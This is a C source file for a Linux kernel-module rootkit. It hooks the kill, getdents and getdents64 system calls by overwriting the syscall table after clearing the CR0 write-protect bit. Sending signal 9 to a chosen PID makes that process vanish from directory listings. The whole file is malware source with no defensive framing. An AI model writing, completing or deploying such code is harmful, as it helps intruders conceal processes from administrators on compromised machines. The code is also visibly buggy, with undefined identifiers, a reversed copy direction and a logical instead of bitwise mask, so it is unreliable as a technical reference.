#include<linux/module.h>
#include "ftrace_helper.h"

#define INVPID 9

char hide_pid[NAME_MAX];

unsigned long *__sysc_table;
typedef asmlinkage (*t_syscall)(const struct pt_regs *);
static t_syscall orig_kill;
static t_syscall orig_getdents64;
static t_syscall orig_getdents;

asmlinkage long (*orig_kill)(const struct pt_regs *regs);

unsigned long *ret_syscall_table(void)
{
  __sysc_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
  return __sysc_table;
}

asmlinkage int handler_kill(const struct pt_regs *regs)
{
	pid_t pid = regs->di;
	int sig=regs->si;
	switch(sig)
	{
		case INVPID:
		  sprintf(hide_pid, "%d", pid);
		  return 0;
		default:
		  return orig_kill(regs);
	}
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents)(const struct pt_regs *regs);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
  int fd=(int)pt_regs->di;
  struct linux_dirent64 __user *dirent = (struct linux_dirent *)pt_regs->si;
  struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;

  unsigned long offset = 0;

  int ret = orig_getdents64(pt_regs);
  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if( (ret <= 0) || (dirent_ker == NULL))
  	return ret;

  long err = copy_from_user(dirent_key, dirent, ret);
  if (err)
  	goto done;

  while (offset < ret)
  {
  	current_dir = (void *)dirent_ker + offset;

  	if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
  	{
  	  if (current_dir == dirent_ker)
      {
  	    ret -= current_dir->d_reclen;
  	    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
  	    continue;
  	  }

  	  previous_dir->d_reclen += current_dir->d_reclen;
  	}

  	else
  	{
  		previous_dir = current_dir;
  	}

  	offset += current_dir->d_reclen;
  }

  error = copy_from_user(dirent, dirent_key, ret);
  if (error)
  	goto done;

done:
  kfree(dirent_ker);
  return ret;

}

asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    int fd = regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    

    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    
    unsigned long offset = 0;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
  kfree(dirent_ker);
  return ret;

}

unsigned long cr0;

static inline void def_cr0(unsigned long val)
{
	unsigned long __force_order;
	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}

static int __init rk_init(void)
{
  unsigned long __sysc = ret_syscall_table();

  def_cr0(cr0 && ~0x00010000);

  orig_getdents64 = (t_syscall)__sysc[__NR_getdents64];
  orig_getdents = (t_syscall)__sysc[__NR_getdents];
  orig_kill = (t_syscall)__sysc[__NR_kill];

  __sysc[__NR_getdents64] = (unsigned long)hook_getdents64;
  __sysc[__NR_getdents] = (unsigned long)hook_getdents;
  __sysc[__NR_kill] = (unsigned long)hook_kill;

  def_cr0(cr0);
  return 0;
}

static void __exit rk_destroy(void)
{
  def_cr0(cr0 && ~0x00010000);

  __sysc[__NR_getdents64] = (unsigned long)orig_getdents64;
  __sysc[__NR_getdents] = (unsigned long)orig_getdents;
  __sysc[__NR_kill] = (unsigned long)orig_kill;

  def_cr0(cr0);
}

module_init(rk_init);
module_exit(rk_destroy);
